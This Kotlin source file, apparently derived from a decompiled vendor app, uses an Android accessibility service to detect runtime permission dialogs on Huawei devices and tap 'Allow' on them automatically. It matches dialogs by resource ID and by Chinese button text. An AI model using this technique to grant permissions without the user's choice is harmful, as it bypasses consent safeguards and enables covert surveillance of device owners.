package com.storm.safe.rock.service.modules.yw5xud.huawei

import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps
import kotlinx.coroutines.delay

/**
 * Step 1/10 -- Basic Permissions (vendor m212169b6, L3524-3724).
 *
 * Only runs on non-Honor devices (vendor L1338: f55064a2==false).
 * Launches [HuaweiPermissionRequestActivity] then polls for runtime permission
 * dialogs (resource-id driven + text fallback) for up to 10 seconds.
 */
class HuaweiStep1BasicPerms(
    private val service: MyAccessibilityService?,
    private val ui: UiAutomation,
    private val steps: HuaweiSteps
) {
    companion object {
        private const val TAG = "HuaweiStep1BasicPerms"
    }

    @Suppress("UNUSED_PARAMETER")
    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        android.util.Log.i(TAG, "[Step1/10] enter executeStep1BasicPermissions (isHuawei=${steps.isHuawei})")
        if (steps.isHuawei) {
            HuaweiStepLogger.skip(1, "荣耀跳过 (vendor L1338 f55064a2=true)", logs)
            return
        }
        HuaweiStepLogger.phase(1, "基础权限开始（超时10秒）", "vendor L3551", logs)

        val detector = HuaweiPageDetector()
        val timeoutMs = 10_000L
        val start = System.currentTimeMillis()
        var clickCount = 0

        // Launch permission request activity
        try {
            val svc = service
            if (svc != null) {
                svc.startActivity(HuaweiPermissionRequestActivity.launchIntent(steps.ctx))
                HuaweiStepLogger.probe(1, "launch-perm-req-activity", "started HuaweiPermissionRequestActivity")
                logs.add("║ [Step1/10] 已启动 HuaweiPermissionRequestActivity")
                delay(800L)
            } else {
                HuaweiStepLogger.probe(1, "launch-perm-req-activity", "service=null,跳过")
            }
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            android.util.Log.w(TAG, "[Step1/10] launch HuaweiPermissionRequestActivity 失败: ${e.message}")
        }

        // Pre-check: if dialog already present, click once
        run {
            val root = service?.rootInActiveWindow
            if (root != null && detector.isNotificationPermissionDialog(root)) {
                logs.add("[Step1/10] [华为权限] 检测到提前弹出的通知权限弹窗, 点击允许/始终允许 (vendor L6408)")
                if (!ui.clickSelector("[text=\"始终允许\"][visibleToUser=true]")) {
                    ui.clickSelector("[text=\"允许\"][visibleToUser=true]")
                }
                clickCount++
                delay(300L)
            }
        }

        // Main loop
        val maxClicksGuard = 40
        while (System.currentTimeMillis() - start < timeoutMs) {
            val root = service?.rootInActiveWindow
            if (root == null) {
                delay(300L)
                continue
            }

            val clickedViaId = clickPermissionControllerAllowButton()
            if (clickedViaId != null) {
                HuaweiStepLogger.probe(1, "allow-by-id", clickedViaId)
                logs.add("[Step1/10] 通过 resource-id '$clickedViaId' 点击允许")
                clickCount++
                delay(300L)
                if (clickCount >= maxClicksGuard) break
                continue
            }

            val dialogTitle = detector.detectPermissionDialogTitle(root)
                ?: if (detector.isNotificationPermissionDialog(root)) "通知" else null
            if (dialogTitle == null) {
                break
            }

            logs.add("[Step1/10] [华为权限] 检测到 '$dialogTitle' 权限弹窗 (vendor L3653)")
            val textClicked = ui.clickSelector("[text=\"始终允许\"][visibleToUser=true]") ||
                ui.clickSelector("[text=\"允许\"][visibleToUser=true]") ||
                ui.clickSelector("[text=\"仅使用期间允许\"][visibleToUser=true]")
            if (textClicked) {
                clickCount++
                delay(300L)
            } else {
                HuaweiStepLogger.probe(1, "no-clickable-button", "dialogTitle=$dialogTitle")
                delay(500L)
            }
            if (clickCount >= maxClicksGuard) break
        }

        val elapsedSec = (System.currentTimeMillis() - start) / 1000L
        logs.add("[Step1/10] [华为基础权限] 完成，用时${elapsedSec}秒，点击 $clickCount 次")
        if (clickCount > 0) {
            successes.add("[Step1/10] 华为基础权限已处理 $clickCount 次允许点击")
        }
    }

    /**
     * Resource-id driven click for permissioncontroller allow buttons.
     * Returns the short id name if clicked, null otherwise.
     */
    private fun clickPermissionControllerAllowButton(): String? {
        val svc = service ?: return null
        val root = try { svc.rootInActiveWindow } catch (_: Exception) { null } ?: return null
        val allowIds = listOf(
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_one_time_button"
        )
        for (id in allowIds) {
            val nodes = try {
                root.findAccessibilityNodeInfosByViewId(id)
            } catch (_: Exception) {
                null
            } ?: continue
            for (n in nodes) {
                try {
                    if (!n.isVisibleToUser) continue
                } catch (_: Exception) { }
                if (ui.click(n)) {
                    return id.substringAfterLast('/')
                }
            }
        }
        return null
    }
}
